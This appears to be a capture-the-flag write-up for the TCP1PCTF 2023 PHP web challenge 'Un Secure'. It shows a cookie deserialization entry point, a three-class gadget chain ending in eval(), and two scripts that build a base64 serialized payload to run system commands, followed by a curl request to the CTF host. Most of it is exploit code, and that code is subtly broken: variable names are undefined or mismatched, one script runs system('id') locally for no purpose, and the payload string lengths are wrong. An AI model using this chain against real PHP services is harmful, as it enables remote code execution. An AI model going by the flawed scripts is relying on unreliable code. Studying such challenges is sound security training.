---
title: TCP1PCTF 2023 – Un Secure [WEB]
contest: TCP1PCTF
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [php-unserialize, gadget-chain, waf1-waf2-waf3, eval-rce, reflection]
attack_chain:
- cookie base64 反序列化
- GadgetThree\Vuln.__toString 调 eval($this->cmd)
- 三层 WAF 检查 waf1===1 / waf2==="\xde\xad\xbe\xef" / waf3===false
- GadgetTwo\Echoers.__destruct 调 klass->get_x() 但 Vuln 是 __toString
- GadgetOne\Adders.x 存 Vuln 实例
- 链子: Echoers.klass=Adders → Adders.x=Vuln → Vuln.__toString→eval(cmd)
- 反射拿私有属性
- php ReflectionClass setAccessible(true) 改 waf1/waf2/waf3/cmd
- 双 gadget: 一是反射 RCE; 二是 Adders(system('id')) 直接拼接
key_payload: cookie=base64(O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";O:16:"GadgetThree\Vuln":4:{...}}})
one_liner: TCP1PCTF 2023 Un Secure：PHP 反序列化 gadget chain 3 件套 + 反射 + 字符串拼接 RCE。
lesson: PHP Gadget 链常以「destruct→call→toString→eval」为模板，命名空间 (GadgetOne/Two/Three) 故意制造跳转。
quality: high
---
# TCP1PCTF 2023 - Un Secure

## 入口
```php
if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);  // <-- 反序列化入口
}
```

## Gadget 链
```php
namespace GadgetOne {
    class Adders {
        private $x;
        public function get_x() { return $this->x; }
    }
}

namespace GadgetTwo {
    class Echoers {
        protected $klass;
        function __destruct() {
            echo $this->klass->get_x();  // 调 klass->get_x()
        }
    }
}

namespace GadgetThree {
    class Vuln {
        public $waf1; protected $waf2; private $waf3;
        public $cmd;
        function __toString() {
            if (!($this->waf1 === 1)) die("not x");
            if (!($this->waf2 === "\xde\xad\xbe\xef")) die("not y");
            if (!($this->waf3) === false) die("not z");
            eval($this->cmd);
        }
    }
}
```

## 利用

### 方案 A - 反射 + 链子
```php
$gadgetThree = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln, 1);
$property = $reflection->getProperty('waf2');
$property->setValue($vuln, "\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setValue($vuln, false);
$property = $reflection->getProperty('cmd');
$property->setValue($vuln, "system('cat *.txt');");

$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection->getProperty('x');
$property->setValue($adders, $vuln);

$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setValue($echoers, $adders);

$serialized = serialize($echoers);
echo base64_encode($serialized);
```

### 方案 B - 直接 system 拼接
```php
$gadgetOne = new \GadgetOne\Adders(system('id'));
$gadgetTwo = new \GadgetTwo\Echoers();
$property->setValue($gadgetTwo, $gadgetOne);
echo base64_encode(serialize($gadgetTwo));
```

## 验证
```bash
curl "http://ctf.tcp1p.com:45678/" -b "cookie=<base64>"
# 反弹 shell 后 cat /flag*
```
